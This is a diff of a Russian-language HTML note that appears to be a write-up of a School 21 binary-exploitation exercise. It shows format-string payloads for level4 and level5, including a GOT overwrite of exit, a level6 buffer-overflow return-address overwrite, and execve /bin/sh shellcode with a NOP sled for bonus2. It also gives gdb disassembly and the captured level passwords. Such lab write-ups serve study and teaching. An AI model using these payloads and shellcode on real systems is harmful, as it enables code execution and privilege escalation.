@@ -6,8 +6,8 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="bear-note-unique-identifier" content="19A97BC4-5FC2-47FA-A124-DBED8C8B8033-26690-000002B09A56C630">
         <meta name="created" content="2022-01-16T16:10:55+0300"/>
-        <meta name="modified" content="2022-01-17T12:42:38+0300"/>
-        <meta name="tags" content="cs, cs/school21"/>
+        <meta name="modified" content="2022-01-17T21:04:38+0300"/>
+        <meta name="tags" content="cs/school21, cs"/>
         <meta name="last device" content="Alexander’s MacBook Air"/>
     </head>
     <body>
@@ -17447,7 +17447,8 @@ CgF/UvJ/ePlF50izl1IAAAAASUVORK5CYII='></p>
 <p><br></p>
 <p>Для записи числа 16930116 используем модификатор <code class='code-inline'>%x</code>. Итоговая команда:</p>
 <br>
-<pre><code class='code-multiline' lang='bash'>./level4 <span class="sf_code_operator">&lt;&lt;&lt;</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "\x10\x98\x04\x08" + "%16930112x" + "%12</span><span class="sf_code_variable">$n</span><span class="sf_code_string">"'</span><span class="sf_code_variable">)</span></code></pre>
+<pre><code class='code-multiline' lang='bash'>$ ./level4 <span class="sf_code_operator">&lt;&lt;&lt;</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "\x10\x98\x04\x08" + "%16930112x" + "%12</span><span class="sf_code_variable">$n</span><span class="sf_code_string">"'</span><span class="sf_code_variable">)</span>
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a</code></pre>
 <p><br></p>
 <hr>
 <h2 id="level5">level5</h2>
@@ -17459,12 +17460,21 @@ CgF/UvJ/ePlF50izl1IAAAAASUVORK5CYII='></p>
 <br>
 <p>Нам нужно заставить программу исполнить функцию <code class='code-inline'>o</code> , ведь именно она запускает программную оболочку. Мы замечаем, что имеющийся вызов к <code class='code-inline'>printf</code> с непроверенным пользовательским кодом делает программу уязвимой к атакам <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">uncontrolled format string</a>. </p>
 <br>
-<p>Нам остается перезаписать сохраненный на стеке <code class='code-inline'>eip</code>  регистр так, чтобы по завершении функции  <code class='code-inline'>n</code>  управления не возвращалось  к <code class='code-inline'>main</code>, а переходило к функции  <code class='code-inline'>o</code>.</p>
+<p>Нам нужно перезаписать <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">global offset table</a> (GOT), для того, чтобы по окончанию функции <code class='code-inline'>n</code> оказывалась вызвана функция <code class='code-inline'>o</code> вместо <code class='code-inline'>exit</code>.</p>
+<br>
+<pre><code class='code-multiline' lang='bash'>$ gdb level5
+<span class="sf_code_punctuation">(</span>gdb<span class="sf_code_punctuation">)</span> disas n
+<span class="sf_code_punctuation">..</span>.
+0x080484ff <span class="sf_code_operator">&lt;</span>+61<span class="sf_code_operator">&gt;</span>:	call   0x80483d0 <span class="sf_code_operator">&lt;</span>exit@plt<span class="sf_code_operator">&gt;</span>
+<span class="sf_code_punctuation">(</span>gdb<span class="sf_code_punctuation">)</span> x/i 0x80483d0
+0x80483d0 <span class="sf_code_operator">&lt;</span>exit@plt<span class="sf_code_operator">&gt;</span>:	jmp    *0x8049838</code></pre>
+<p><br></p>
+<p>Значит, нам нужно записать адрес функции <code class='code-inline'>o</code> в ячейку памяти <code class='code-inline'>0x8049838</code>.</p>
 <br>
 <p>Функция <code class='code-inline'>o</code> находится по адресу <code class='code-inline'>0x080484a4</code>, что соответствует числу <code class='code-inline'>134513828</code> в десятичной системе. Как и в level3, буфер, содержащий форматную строку, находятся на расстоянии в <code class='code-inline'>0x218-0x208=0x10</code> байтов от вершины стека. </p>
 <br>
 <p>Итого,</p>
-<pre><code class='code-multiline' lang='bash'>$ <span class="sf_code_punctuation">(</span>python -c <span class="sf_code_string">'print "\x38\x98\x04\x08" + "%134513824x" + "%4</span><span class="sf_code_variable">$n</span><span class="sf_code_string">"'</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">echo</span> <span class="sf_code_string">'echo start; cd ..; cat level6/.pass'</span><span class="sf_code_punctuation">)</span> <span class="sf_code_operator">|</span> ./level5 <span class="sf_code_operator">&gt;</span> /tmp/level5_out <span class="sf_code_punctuation">;</span> <span class="sf_code_function">cat</span> /tmp/level5_out <span class="sf_code_operator">|</span> <span class="sf_code_function">grep</span> -A10 -i start
+<pre><code class='code-multiline' lang='bash'>$ <span class="sf_code_punctuation">(</span>python -c <span class="sf_code_string">'print "\x38\x98\x04\x08" + "%134513824x" + "%4</span><span class="sf_code_variable">$n</span><span class="sf_code_string">"'</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">echo</span> <span class="sf_code_string">'echo ; echo start; cd ..; cat level6/.pass'</span><span class="sf_code_punctuation">)</span> <span class="sf_code_operator">|</span> ./level5 <span class="sf_code_operator">&gt;</span> /tmp/level5_out <span class="sf_code_punctuation">;</span> <span class="sf_code_function">cat</span> /tmp/level5_out <span class="sf_code_operator">|</span> <span class="sf_code_function">grep</span> -A10 -i start
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31</code></pre>
 <p><br></p>
 <hr>
@@ -20590,7 +20600,8 @@ SUVORK5CYII='></p>
 <br>
 <p>Итоговая команда:</p>
 <br>
-<pre><code class='code-multiline' lang='bash'>./level6 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*72 + "\x54\x84\x04\x08"'</span><span class="sf_code_variable">)</span></code></pre>
+<pre><code class='code-multiline' lang='bash'>./level6 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*72 + "\x54\x84\x04\x08"'</span><span class="sf_code_variable">)</span>
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d</code></pre>
 <p><br></p>
 <hr>
 <h2 id="level7">level7</h2>
@@ -20733,9 +20744,9 @@ login</code></pre>
 
 <span class="sf_code_keyword">int</span> <span class="sf_code_function">main</span><span class="sf_code_punctuation">(</span><span class="sf_code_keyword">int</span> argc<span class="sf_code_punctuation">,</span> <span class="sf_code_keyword">char</span><span class="sf_code_operator">**</span> argv<span class="sf_code_punctuation">,</span> <span class="sf_code_keyword">char</span><span class="sf_code_operator">**</span> envp<span class="sf_code_punctuation">)</span> <span class="sf_code_punctuation">{</span>
 	<span class="sf_code_keyword">if</span> <span class="sf_code_punctuation">(</span>argc <span class="sf_code_operator">&gt;</span> <span class="sf_code_number">1</span><span class="sf_code_punctuation">)</span> <span class="sf_code_punctuation">{</span>
-		<span class="sf_code_keyword">auto</span> n1 <span class="sf_code_operator">=</span> <span class="sf_code_keyword">new</span> <span class="sf_code_function">N</span><span class="sf_code_punctuation">(</span><span class="sf_code_number">5</span><span class="sf_code_punctuation">);</span>
-		<span class="sf_code_keyword">auto</span> n2 <span class="sf_code_operator">=</span> <span class="sf_code_keyword">new</span> <span class="sf_code_function">N</span><span class="sf_code_punctuation">(</span><span class="sf_code_number">6</span><span class="sf_code_punctuation">);</span>
-
+		<span class="sf_code_keyword">auto</span> n1 <span class="sf_code_operator">=</span> <span class="sf_code_keyword">new</span> <span class="sf_code_function">M</span><span class="sf_code_punctuation">(</span><span class="sf_code_number">5</span><span class="sf_code_punctuation">);</span>
+		<span class="sf_code_keyword">auto</span> n2 <span class="sf_code_operator">=</span> <span class="sf_code_keyword">new</span> <span class="sf_code_function">M</span><span class="sf_code_punctuation">(</span><span class="sf_code_number">6</span><span class="sf_code_punctuation">);</span>
+		
     	n1<span class="sf_code_operator">-&gt;</span><span class="sf_code_function">setAnnotation</span><span class="sf_code_punctuation">(</span>argv<span class="sf_code_punctuation">[</span><span class="sf_code_number">1</span><span class="sf_code_punctuation">]);</span>
     	<span class="sf_code_constant">return</span> <span class="sf_code_punctuation">(</span>n2<span class="sf_code_operator">-&gt;*</span><span class="sf_code_punctuation">(</span>n2<span class="sf_code_operator">-&gt;</span>func<span class="sf_code_punctuation">))(</span><span class="sf_code_operator">*</span>n1<span class="sf_code_punctuation">);</span>
 	<span class="sf_code_punctuation">}</span>
@@ -45480,7 +45491,8 @@ rkJggg=='></p>
 <br>
 <p>Итоговая команда:</p>
 <br>
-<pre><code class='code-multiline' lang='bash'>$ LANG<span class="sf_code_operator">=</span>fi ./bonus2 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'</span><span class="sf_code_variable">)</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*18 + "\xd0\xf6\xff\xbf"'</span><span class="sf_code_variable">)</span></code></pre>
+<pre><code class='code-multiline' lang='bash'>$ LANG<span class="sf_code_operator">=</span>fi ./bonus2 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'</span><span class="sf_code_variable">)</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*18 + "\xd0\xf6\xff\xbf"'</span><span class="sf_code_variable">)</span>
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587</code></pre>
 <p><br></p>
 <h3 id="Второй способ:">Второй способ:</h3>
 <br>
@@ -45490,7 +45502,8 @@ rkJggg=='></p>
 <br>
 <pre><code class='code-multiline' lang='bash'>$ <span class="sf_code_function">export</span> EXPLOIT<span class="sf_code_operator">=</span><span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'</span><span class="sf_code_variable">)</span>
 
-$ ./bonus2 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a" * 40'</span><span class="sf_code_variable">)</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*18 + "\x10\xf5\xff\xbf"'</span><span class="sf_code_variable">)</span></code></pre>
+$ LANG<span class="sf_code_operator">=</span>fi ./bonus2 <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a" * 40'</span><span class="sf_code_variable">)</span> <span class="sf_code_variable">$(python -c </span><span class="sf_code_string">'print "a"*18 + "\x10\xf5\xff\xbf"'</span><span class="sf_code_variable">)</span>
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587</code></pre>
 <p><br></p>
 <hr>
 <h2 id="bonus3">bonus3</h2>
